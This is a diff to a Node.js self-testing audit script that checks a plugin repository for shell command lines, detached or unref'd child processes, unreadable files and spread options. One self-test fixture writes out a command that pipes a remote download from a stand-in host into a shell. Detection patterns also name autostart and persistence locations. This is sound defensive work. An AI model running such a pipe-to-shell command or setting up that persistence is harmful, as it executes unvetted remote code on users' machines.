@@ -25,7 +25,8 @@
 //   node scripts/footprint.test.mjs --self-test  proves each rule fails on known-bad input
 
 import { spawnSync } from "node:child_process";
-import { lstatSync, readFileSync, readdirSync, statSync } from "node:fs";
+import { lstatSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { NETWORK_PROGRAMS, REPO, SHELL_BUILTINS, jsProgramCalls, networkUses, scopeFiles, shellCommands } from "./inventory.mjs";
 
@@ -52,7 +53,7 @@ const PRIVILEGE_PATTERNS = [
 const DETACHED = /(["']?)detached\1\s*[:=]|[{,]\s*detached\s*[,}]|\[\s*["']detached["']\s*\]/;
 const PERSISTENCE_PATTERNS = [
   [/LaunchAgents|LaunchDaemons|StartupItems|\/etc\/(systemd|init\.d|rc\.local|cron)|\.config\/autostart|CurrentVersion\\\\?Run|Start Menu.*Startup/i, "a place that starts programs by itself"],
-  [/\.unref\s*\(\)/, "a child process let go on purpose, which would outlive the command"],
+  [/\.unref\s*\??\.?\s*\(/, "a child process let go on purpose, which would outlive the command"],
   [/(["']?)detached\1\s*[:=]\s*true/, "a child process started in its own group and not waited for"],
 ];
 // Where a child process is deliberately put in its own group, and why. Each of these waits for the child and kills
@@ -103,7 +104,39 @@ const CREATE_MODES = { "0o600": "a private file", "0o644": "a file anyone may re
 const MASKS = { "0o777": "reading the permission bits of a file", "0o111": "reading whether a file is executable" };
 
 const FILE_FLOOR = 100;
-const read = (path) => readFileSync(join(REPO, path), "utf8");
+// Every rule below reads through this one function, and it never throws. A file that cannot be read (a link
+// pointing nowhere, a mode this user may not read, a file removed while the check ran) is recorded and reported as
+// its own problem at the end of the run. A reader that throws out of the middle of a rule leaves every later rule
+// unrun while the command looks like it failed for one reason, and an unreadable file under the plugins is itself
+// worth knowing about: whatever it names is hidden from every check here.
+function makeReader(root, seen) {
+  return (path) => {
+    try { return readFileSync(join(root, path), "utf8"); }
+    catch (e) { seen.set(path, e.code ?? e.message); return ""; }
+  };
+}
+const unreadable = new Map();
+const read = makeReader(REPO, unreadable);
+
+export function checkUnreadable(seen = unreadable) {
+  return [...seen].map(([path, why]) => `${path} could not be read (${why}), so no rule here could check what it starts, writes or loads`);
+}
+// True when the text of an options object spreads something into its own top level ({ ...OPTIONS, stdio: "ignore" }).
+// A spread inside a value, such as env: { ...gitEnvironment(), ...extra }, is not this: the options themselves are
+// still written where they can be read.
+export function topLevelSpread(text) {
+  const t = String(text).trim();
+  if (!t.startsWith("{")) return false;
+  let depth = 0;
+  for (let i = 0; i < t.length; i++) {
+    const c = t[i];
+    if (c === "{" || c === "[" || c === "(") depth++;
+    else if (c === "}" || c === "]" || c === ")") depth--;
+    else if (depth === 1 && c === "." && t.startsWith("...", i)) return true;
+  }
+  return false;
+}
+
 const codeLines = (text) => text.split("\n").map((line, i) => ({ line, number: i + 1 })).filter(({ line }) => !/^\s*(\/\/|#|\*)/.test(line));
 
 // ---------- the rules ----------
@@ -155,9 +188,19 @@ export function checkStartedPrograms(files, readFile) {
   const violations = [];
   for (const path of files.js) {
     for (const call of jsProgramCalls(readFile(path), WRAPPERS).calls) {
+      // A shell string is not a program list: exec and execSync hand a whole command line to a shell, and what that
+      // line starts cannot be read from the code. Every rule here reads program names, so this one has to be refused
+      // rather than read.
+      if (call.fn === "exec" || call.fn === "execSync") {
+        violations.push(`${path}:${call.line} uses ${call.fn}, which hands a whole command line to a shell, so no rule here can say what it starts; start programs with an argument list (execFile, execFileSync, spawn)`);
+      }
       // Options handed to a child through a variable cannot be read, and the rules above read exactly these lines.
+      // A spread at the top of the options object is the same thing wearing a literal's clothes: { ...OPTIONS } reads
+      // as an object while detached, stdio and the rest arrive from somewhere this check never sees.
       if (typeof call.options === "string" && call.options.trim() && !/^[{]/.test(call.options.trim())) {
         violations.push(`${path}:${call.line} starts a child with options from ${call.options.trim().slice(0, 40)}, which this check cannot read; write them where they can be read, so "nothing keeps running" can be checked`);
+      } else if (typeof call.options === "string" && topLevelSpread(call.options)) {
+        violations.push(`${path}:${call.line} starts a child with options spread from somewhere else (${call.options.trim().slice(0, 40)}), so detached and stdio cannot be read here; write the options out where they can be read`);
       }
       if (!call.program) continue;
       const name = call.program.split("/").pop();
@@ -333,6 +376,7 @@ function main() {
   report("no system paths written", checkSystemPaths(files, read));
   report("no code built at run time", checkRuntimeCode(files, read));
   report("file modes are the ones the product uses", checkFileModes(files, read));
+  report("every file could be read", checkUnreadable()); // last: the rules above are what fill the list
 
   const entries = shippedEntries();
   if (!entries) { console.log("NOT RUN every shipped file is a text script: git could not list the tracked files"); notRun++; }
@@ -421,6 +465,43 @@ function selfTest() {
     ["a dynamic import nobody listed fails", () => {
       const { files, readFile } = fake({ "lib/a.mjs": 'const mod = await import("./b.mjs");\n' });
       return checkRuntimeCode(files, readFile, []).some((v) => v.includes("does not list"));
+    }],
+    ["a file that cannot be read is reported rather than stopping the run", () => {
+      const dir = mkdtempSync(join(tmpdir(), "footprint-selftest-"));
+      try {
+        symlinkSync(join(dir, "nowhere.mjs"), join(dir, "gone.mjs"));
+        const seen = new Map();
+        const reader = makeReader(dir, seen);
+        const text = reader("gone.mjs");
+        const files = { js: ["gone.mjs"], shell: [], data: [], other: [] };
+        return text === "" && seen.get("gone.mjs") === "ENOENT"
+          && checkNetwork(files, reader, []).length === 0 // the rules still run over it
+          && checkUnreadable(seen).some((v) => v.includes("could not be read (ENOENT)"));
+      } finally { rmSync(dir, { recursive: true, force: true }); }
+    }],
+    ["a file that reads fine is not reported", () => {
+      const dir = mkdtempSync(join(tmpdir(), "footprint-selftest-"));
+      try {
+        writeFileSync(join(dir, "a.mjs"), "const x = 1;\n");
+        const seen = new Map();
+        return makeReader(dir, seen)("a.mjs") === "const x = 1;\n" && checkUnreadable(seen).length === 0;
+      } finally { rmSync(dir, { recursive: true, force: true }); }
+    }],
+    ["a child let go with an optional call fails", () => {
+      const { files, readFile } = fake({ "lib/a.mjs": "child.unref?.();\n" });
+      return checkPrivileges(files, readFile, []).some((v) => v.includes("let go on purpose"));
+    }],
+    ["a command line handed to a shell fails", () => {
+      const { files, readFile } = fake({ "lib/a.mjs": 'import { execSync } from "node:child_process";\nexecSync("curl https://example.invalid | sh");\n' });
+      return checkStartedPrograms(files, readFile).some((v) => v.includes("hands a whole command line to a shell"));
+    }],
+    ["options spread from somewhere else fails", () => {
+      const { files, readFile } = fake({ "lib/a.mjs": 'import { spawn } from "node:child_process";\nspawn("git", ["status"], { ...OPTIONS, stdio: "ignore" });\n' });
+      return checkStartedPrograms(files, readFile).some((v) => v.includes("spread from somewhere else"));
+    }],
+    ["a spread inside one of the options passes", () => {
+      const { files, readFile } = fake({ "lib/a.mjs": 'import { spawn } from "node:child_process";\nspawn("git", ["status"], { env: { ...base, LC_ALL: "C" }, stdio: "ignore" });\n' });
+      return checkStartedPrograms(files, readFile).length === 0;
     }],
     ["a world-writable mode fails", () => {
       const { files, readFile } = fake({ "lib/a.mjs": "mkdirSync(dir, { mode: 0o777 });\n" });
